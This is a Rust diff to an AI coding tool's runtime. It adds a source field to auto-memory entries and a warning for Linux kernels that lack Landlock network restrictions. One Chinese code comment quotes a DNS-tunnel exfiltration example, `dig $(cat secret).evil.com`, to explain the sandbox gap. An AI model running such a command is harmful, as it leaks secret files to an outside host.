@@ -72,6 +72,7 @@ impl AutoMemoryWriter for AutoMemoryAdapter {
         content: String,
         category: MemoryCategory,
         confidence: f64,
+        source: Option<String>,
     ) -> BoxFuture<'_, Result<usize, ToolError>> {
         Box::pin(async move {
             let cat = match category {
@@ -81,7 +82,7 @@ impl AutoMemoryWriter for AutoMemoryAdapter {
                 MemoryCategory::Decision => AutoCategory::Decision,
             };
             self.inner
-                .add_entry(topic, content, cat, confidence)
+                .add_entry_with_source(topic, content, cat, confidence, source)
                 .await
                 .map_err(|e: MemoryError| ToolError::Exec(format!("auto memory: {e}")))
         })
@@ -363,6 +364,18 @@ fn inner_build_runtime(
                     "OS 沙箱未硬化（is_hardened=false）：仅应用层权限生效，\
                      无内核级文件/网络隔离。建议在 Linux（landlock）或受信容器中运行；\
                      详情见 `minicoding doctor --security`（security.md §8）"
+                );
+            }
+            //  Linux 上 Landlock 网络原语需 ABI≥4（内核 6.7+）——
+            // 旧内核下沙箱子进程 TCP/UDP/DNS 全部开放（DNS 隧道 `dig $(cat
+            // secret).evil.com` 通道保留）。 的"未硬化"警告不区分网络子项，
+            // 此处显式补充，防用户误以为旧内核上网络也受沙箱约束。
+            #[cfg(target_os = "linux")]
+            if driver.is_hardened() && !minicoding_sandbox::linux::net_restriction_supported() {
+                tracing::warn!(
+                    "Linux 内核不支持 Landlock 网络原语（需 ABI≥4 / 6.7+）：\
+                     沙箱子进程的网络（TCP/UDP/DNS）不受 OS 沙箱约束。\
+                     若需断网隔离，建议升级内核或使用 `--features seccomp` 编译"
                 );
             }
             Some((driver, policy))
